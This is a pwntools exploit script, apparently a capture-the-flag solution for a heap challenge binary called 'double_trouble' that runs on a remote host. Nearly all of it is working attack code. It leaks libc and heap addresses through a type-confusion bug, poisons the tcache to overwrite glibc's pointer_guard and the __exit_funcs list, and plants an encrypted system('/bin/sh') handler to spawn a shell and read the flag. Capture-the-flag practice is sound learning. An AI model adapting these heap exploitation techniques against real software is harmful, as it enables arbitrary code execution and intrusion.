#!/usr/bin/env python3

from pwn import *

TARGET = './double_trouble'
HOST = '103.185.52.198'
PORT = 4920

elf = ELF(TARGET)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

context.arch = 'amd64'
gdb_script = f"""
  b *main
  b *exit
  c
  c
"""
# context.log_level = 'DEBUG'

if args.GDB:
  context.terminal = [
    'wt.exe', '-w', '0', 'new-tab', '--', 'bash', '-lc'
  ]
  p = gdb.debug(TARGET, gdbscript=gdb_script)
elif not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

# ===================================== #

rol = lambda val, r_bits, max_bits: \
  (val << r_bits%max_bits) & (2**max_bits-1) | \
  ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

# encrypt a function pointer
def encrypt(v, key):
  return rol(v ^ key, 0x11, 64)

def mangle(val, base):
  return val ^ (base >> 12)

def request(idx, weight: int, name):
  p.sendlineafter(b'> ', str(1).encode())
  p.sendlineafter(b'Index: ', str(idx).encode())
  p.sendafter(b'Name: ', name)
  p.sendlineafter(b'Gender (F/M): ', b'f')
  p.sendlineafter(b'Age: ', str(0x6477).encode())
  p.sendlineafter(b'Height: ', str(0x733b).encode())
  p.sendlineafter(b'Weight: ', str(weight).encode())

def remove(idx: int):
  p.sendlineafter(b'> ', str(2).encode())
  p.sendlineafter(b'Index: ', str(idx).encode())

def change(idx, weight, name):
  p.sendlineafter(b'> ', str(3).encode())
  p.sendlineafter(b'Index: ', str(idx).encode())
  p.sendafter(b'New Name: ', name)
  p.sendlineafter(b'Gender (F/M): ', b'f')
  p.sendlineafter(b'New Age: ', str(0x6477).encode())
  p.sendlineafter(b'New Height: ', str(0x733b).encode())
  p.sendlineafter(b'New Weight: ', str(weight).encode())

def check(idx: int):
  p.sendlineafter(b'> ', str(4).encode())
  p.sendlineafter(b'Index: ', str(idx).encode())

# ===================================== #

# Leak libc & heap #
request(0, 0x68, b'A' * 8) # Chunk used for control (crucial chunk)
for i in range(1, 9): # idx 1 - 8
  request(i, 0x68, b'B' * 8)
for i in range(8, 0, -1): # idx 1 - 8
  remove(i)

p.sendlineafter(b'> ', b'1' * 0x420)
change(0, 0x60676768, b'E' * 8)
check(0)
p.recvuntil(b'Name    : ')
libc_leak = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = libc_leak - 0x1d3d20
system = libc.sym.system
binsh = next(libc.search(b'/bin/sh\x00'))
fsbase = (libc.address - 0x28c0) + 0x30
__exit_funcs = libc.address + 0x1d3820
print(f"libc base       : {hex(libc.address)}")
print(f"fsbase          : {hex(fsbase)}")
print(f"__exit_funcs    : {hex(__exit_funcs)}")

for i in range(1, 9): # idx 1 - 8
  request(i, 0x68, b'E' * 8)
remove(1) # tcache counter
change(0, 0xf0676768, b'F' * 6)
check(0)
p.recvuntil(b'Name    : ')
heap_base = u64(p.recv(5).ljust(8, b'\x00')) << 12
print(f"heap base       : {hex(heap_base)}")
# ========== #

# Arbitrary tcache poisoning -> __exit_funcs #
request(1, 0x68, b'H' * 6)
remove(8) # tc counter
remove(1) # victim
p1 = p64(mangle(fsbase, heap_base+0x3f0))
change(0, 0x80676768, p1)

request(1, 0x68, b'J' * 6) # throw away
pause()
p2 = p64(0xdeadbeefcafebabe) # new pointer_guard value
request(8, 0x68, p2) # fsbase pointer_guard overwritten

remove(2)
remove(1)
change(0, 0xf0676768, b'K' * 6)
p3 = p64(mangle(__exit_funcs, heap_base+0x3f0))
change(0, 0xff676768, p3)

p4 = p64(0x0) + p64(0x1) + p64(0x4) + p64(encrypt(system, 0xdeadbeefcafebabe)) + p64(binsh)
request(9, 0x27, p4)

request(1, 0x69, p64(heap_base+0x3f0))

p6 = p64(0x0) + p64(0x1) + p64(0x4) + p64(encrypt(system, 0xdeadbeefcafebabe)) + p64(binsh)
change(9, 0x37, p6)
# ========== #

# Trigger Shell #
p.sendlineafter(b'> ', str(5).encode())
p.sendline(b'ls ; cat flag.txt')
# ========== #

p.interactive()
# NOTE:
# Type confusion -> ARB Read/Write
# Overwriting __exit_funcs
